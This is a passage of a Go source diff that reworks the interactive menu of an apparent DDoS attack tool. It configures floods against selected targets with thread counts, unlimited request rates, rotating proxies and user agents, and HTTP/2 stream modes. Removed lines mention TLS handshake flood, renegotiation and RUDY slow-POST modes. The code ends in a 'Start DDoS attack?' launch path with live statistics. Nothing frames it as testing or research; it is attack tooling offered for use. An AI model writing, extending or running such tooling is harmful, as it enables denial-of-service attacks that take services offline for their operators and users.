 			fmt.Print("Enter max streams per connection (default: 100): ")
 			streamsStr, _ := reader.ReadString('\n')
 			streamsStr = strings.TrimSpace(streamsStr)
@@ -1060,121 +625,60 @@ func (m *Menu) ddosAttack() {
 			config.MaxThreads = maxThreads
 			config.Duration = duration
 			config.RateLimit = rateLimit
-			config.ReuseConnections = reuseConnections
 			config.Timeout = timeout
 			// Apply proxy settings
-			config.UseProxy = useProxy
 			config.ProxyList = proxyList
 			config.RotateProxy = rotateProxy
-			// Apply custom user agents settings
-			config.UseCustomUserAgents = useCustomUserAgents
-			if useCustomUserAgents {
-				config.UserAgentFilePath = filepath.Join(dataDir, "user-agent.txt")
-			}
-			// Apply TLS settings
-			// Note: UseTLSAttack and TLSHandshakeFlood are deprecated when using ModeTLSHandshakeFlood
-			if attackMode != ddos.ModeTLSHandshakeFlood {
-				config.UseTLSAttack = false
-				config.TLSHandshakeFlood = false
-			}
-			config.ForceTLS = forceTLS
-			config.TLSRenegotiation = tlsRenegotiation
-			config.TLSMinVersion = tlsMinVersion
-			config.TLSMaxVersion = tlsMaxVersion
-			config.TLSCipherSuites = tlsCipherSuites
-			// Apply HTTP/2 and advanced settings
-			config.UseHTTP2 = useHTTP2
-			config.AdaptiveRateLimit = adaptiveRateLimit
-			config.RUDYDelay = rudyDelay
-			config.RUDYBodySize = rudyBodySize
+			// Apply user agent settings (from baseConfig)
+			config.UserAgentFile = baseConfig.UserAgentFile
+			// Apply HTTP/2 settings
 			config.MaxStreamsPerConn = maxStreamsPerConn
 		}
 	} // End of manual configuration mode
 
-	// Summary before starting
-	fmt.Println("\n" + strings.Repeat("=", 70))
-	fmt.Println("                    ATTACK CONFIGURATION SUMMARY")
-	fmt.Println(strings.Repeat("=", 70))
-	fmt.Printf("Targets:           %d\n", len(selectedConfigs))
-	firstConfig := selectedConfigs[0]
-	fmt.Printf("Attack Mode:       %s\n", firstConfig.AttackMode)
-	fmt.Printf("Threads:           %d\n", firstConfig.MaxThreads)
-	fmt.Printf("Duration:          %s\n", firstConfig.Duration)
-	if firstConfig.RateLimit > 0 {
-		fmt.Printf("Rate Limit:        %d req/s\n", firstConfig.RateLimit)
-	} else {
-		fmt.Printf("Rate Limit:        Unlimited\n")
-	}
-	fmt.Printf("Reuse Connections: %v\n", firstConfig.ReuseConnections)
-	fmt.Printf("Request Timeout:   %s\n", firstConfig.Timeout)
-	if firstConfig.UseCustomUserAgents {
-		fmt.Printf("User Agents:       Custom (from user-agent.txt)\n")
-	} else {
-		fmt.Printf("User Agents:       Built-in\n")
-	}
-	if firstConfig.UseProxy {
-		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
-	} else {
-		fmt.Printf("Proxy:             Disabled\n")
-	}
-	if firstConfig.AttackMode == ddos.ModeTLSHandshakeFlood {
-		fmt.Printf("TLS Handshake Flood: Enabled\n")
-		if firstConfig.ForceTLS {
-			fmt.Printf("  - Force TLS:     Enabled\n")
+	// Summary before starting (only for custom mode)
+	if !useQuickStart {
+		fmt.Println("\n" + strings.Repeat("=", 70))
+		fmt.Println("                    ATTACK CONFIGURATION SUMMARY")
+		fmt.Println(strings.Repeat("=", 70))
+		fmt.Printf("Targets:           %d\n", len(selectedConfigs))
+		firstConfig := selectedConfigs[0]
+		fmt.Printf("Attack Mode:       %s\n", firstConfig.AttackMode)
+		fmt.Printf("Threads:           %d\n", firstConfig.MaxThreads)
+		fmt.Printf("Duration:          %s\n", firstConfig.Duration)
+		if firstConfig.RateLimit > 0 {
+			fmt.Printf("Rate Limit:        %d req/s\n", firstConfig.RateLimit)
+		} else {
+			fmt.Printf("Rate Limit:        Unlimited\n")
 		}
-		if firstConfig.TLSMinVersion > 0 || firstConfig.TLSMaxVersion > 0 {
-			fmt.Printf("  - TLS Versions:   Min=0x%04x, Max=0x%04x\n", firstConfig.TLSMinVersion, firstConfig.TLSMaxVersion)
+		fmt.Printf("Request Timeout:   %s\n", firstConfig.Timeout)
+		if firstConfig.UserAgentFile != "" {
+			fmt.Printf("User Agents:       Custom (from %s)\n", firstConfig.UserAgentFile)
+		} else {
+			fmt.Printf("User Agents:       Built-in (always rotated)\n")
 		}
-	} else if firstConfig.TLSRenegotiation {
-		fmt.Printf("TLS Renegotiation:  Enabled (for Slowloris)\n")
-	}
-	if firstConfig.UseHTTP2 {
-		fmt.Printf("HTTP/2 Support:    Enabled\n")
-	}
-	if firstConfig.AdaptiveRateLimit {
-		fmt.Printf("Adaptive Rate:     Enabled\n")
-	}
-	if firstConfig.AttackMode == ddos.ModeRUDY {
-		fmt.Printf("RUDY Config:       %d bytes, %s delay\n", firstConfig.RUDYBodySize, firstConfig.RUDYDelay)
-	}
-	if firstConfig.AttackMode == ddos.ModeHTTP2StreamFlood {
-		fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
-	}
-	fmt.Println(strings.Repeat("=", 70))
+		if len(firstConfig.ProxyList) > 0 {
+			fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
+		} else {
+			fmt.Printf("Proxy:             Disabled\n")
+		}
+		// Deprecated modes and settings removed (simplified)
+		if firstConfig.AttackMode == ddos.ModeHTTP2 {
+			fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
+		}
+		fmt.Println(strings.Repeat("=", 70))
 
-	// Ask if user wants to save configuration as template before attack (only for manual mode)
-	if configChoice != "1" {
-		fmt.Print("\nSave this configuration as a template? (y/n, default: n): ")
-		saveConfigStr, _ := reader.ReadString('\n')
-		saveConfigStr = strings.TrimSpace(strings.ToLower(saveConfigStr))
-
-		if saveConfigStr == "y" || saveConfigStr == "yes" {
-			fmt.Print("Enter template name (without .txt extension): ")
-			templateName, _ := reader.ReadString('\n')
-			templateName = strings.TrimSpace(templateName)
-			if templateName != "" {
-				if !strings.HasSuffix(templateName, ".txt") {
-					templateName += ".txt"
-				}
-				savedPath, err := ddos.SaveConfigAsTemplate(firstConfig, templateName)
-				if err != nil {
-					fmt.Printf("Error saving template: %v\n", err)
-				} else {
-					fmt.Printf("✓ Template saved: %s\n", savedPath)
-				}
-			}
+		// Final confirmation
+		fmt.Print("\nStart DDoS attack? (y/n): ")
+		startConfirm, _ := reader.ReadString('\n')
+		startConfirm = strings.TrimSpace(strings.ToLower(startConfirm))
+		if startConfirm != "y" {
+			fmt.Println("Attack cancelled.")
+			return
 		}
 	}
 
-	// Final confirmation
-	fmt.Print("\nStart DDoS attack? (y/n): ")
-	startConfirm, _ := reader.ReadString('\n')
-	startConfirm = strings.TrimSpace(strings.ToLower(startConfirm))
-	if startConfirm != "y" {
-		fmt.Println("Attack cancelled.")
-		return
-	}
-
+startAttack:
 	// Create context for graceful shutdown
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -1183,7 +687,39 @@ func (m *Menu) ddosAttack() {
 	fmt.Println("\n" + strings.Repeat("=", 70))
 	fmt.Println("                    DDoS ATTACK IN PROGRESS")
 	fmt.Println(strings.Repeat("=", 70))
-	fmt.Println("Press Ctrl+C to stop the attack...")
+	
+	// Display configuration summary for quick start mode
+	firstConfig := selectedConfigs[0]
+	if useQuickStart {
+		fmt.Println("\n                    ATTACK CONFIGURATION SUMMARY")
+		fmt.Println(strings.Repeat("=", 70))
+		fmt.Printf("Targets:           %d\n", len(selectedConfigs))
+		fmt.Printf("Attack Mode:       %s\n", firstConfig.AttackMode)
+		fmt.Printf("Threads:           %d\n", firstConfig.MaxThreads)
+		fmt.Printf("Duration:          %s\n", firstConfig.Duration)
+		if firstConfig.RateLimit > 0 {
+			fmt.Printf("Rate Limit:        %d req/s\n", firstConfig.RateLimit)
+		} else {
+			fmt.Printf("Rate Limit:        Unlimited\n")
+		}
+		fmt.Printf("Request Timeout:   %s\n", firstConfig.Timeout)
+		if firstConfig.UserAgentFile != "" {
+			fmt.Printf("User Agents:       Custom (from %s)\n", firstConfig.UserAgentFile)
+		} else {
+			fmt.Printf("User Agents:       Built-in (always rotated)\n")
+		}
+		if len(firstConfig.ProxyList) > 0 {
+			fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
+		} else {
+			fmt.Printf("Proxy:             Disabled\n")
+		}
+		if firstConfig.AttackMode == ddos.ModeHTTP2 {
+			fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
+		}
+		fmt.Println(strings.Repeat("=", 70))
+	}
+	
+	fmt.Println("\nPress Ctrl+C to stop the attack...")
 	fmt.Println()
 
 	var attacks []*ddos.DDoSAttack
@@ -1256,7 +792,7 @@ func (m *Menu) ddosAttack() {
 					}
 
 					proxyInfo := ""
-					if firstConfig.UseProxy {
+					if len(firstConfig.ProxyList) > 0 {
 						proxyInfo = fmt.Sprintf(" | Proxies (active/disabled): %d/%d", totalActiveProxies, totalDisabledProxies)
 					}
 
@@ -1299,7 +835,7 @@ func (m *Menu) ddosAttack() {
 		fmt.Printf("  Data Received:     %s\n", ddos.FormatBytes(stats.BytesReceived))
 		fmt.Printf("  Avg Response Time: %s\n", stats.AvgResponseTime)
 		fmt.Printf("  Requests/sec:      %.2f\n", stats.RequestsPerSec)
-		if selectedConfigs[i].UseProxy {
+		if len(selectedConfigs[i].ProxyList) > 0 {
 			fmt.Printf("  Proxies Active:    %d\n", stats.ActiveProxies)
 			fmt.Printf("  Proxies Disabled:  %d\n", stats.DisabledProxies)
 		}
